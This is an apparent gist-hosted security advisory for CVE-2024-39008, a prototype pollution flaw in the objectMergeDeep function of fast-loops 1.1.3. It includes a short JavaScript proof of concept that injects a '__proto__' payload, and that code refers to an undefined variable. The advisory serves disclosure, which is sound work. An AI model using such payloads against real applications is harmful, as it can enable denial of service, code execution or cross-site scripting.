[CVE-2024-39008] Vulnerability Advisory: Prototype Pollution in fast-loops@1.1.3

 [Raw](/mestrtee/f09a507c8d59fbbb7fd40880cd9b87ed/raw/f566898941a176ca52667e9aedcf123bc4d5932c/Advisory_robinweser.md)

[**Advisory\_robinweser.md**](#file-advisory_robinweser-md)

**Vulnerability type:**
Prototype Pollution

**SVSS Score**
10 CRITICAL

**Vendor of the Package:**
robinweser

**Affected Package:**

* Product: fast-loops
* Version: 1.1.3

**Affected component(s):**

```
objectMergeDeep
```

**Attack vector(s):**
the attacker can modify built-in Object.prototype by calling the vulnerable function: `objectMergeDeep` with an argument containing a special property `__proto__` to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

**Description:**
Affected versions of this package are vulnerable to Prototype Pollution through the vulnerable function: `objectMergeDeep`. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulenrable function crafted with the built-in property: `__proto__`. The attack can potentially escalated to Denial of service, remote code execution or cross-site scripting attacks depends on the gadgets that may affected by the attack

**Proof-of-Concept:**

```
(async () => {
  const lib = await import('fast-loops');

  var victim = {}

  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {

  lib.objectMergeDeep (emptyObj, JSON.parse('{"__proto__":{"test":123}}'))

  } catch (e) { }

  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  delete Object.prototype.polluted;

  })();
```
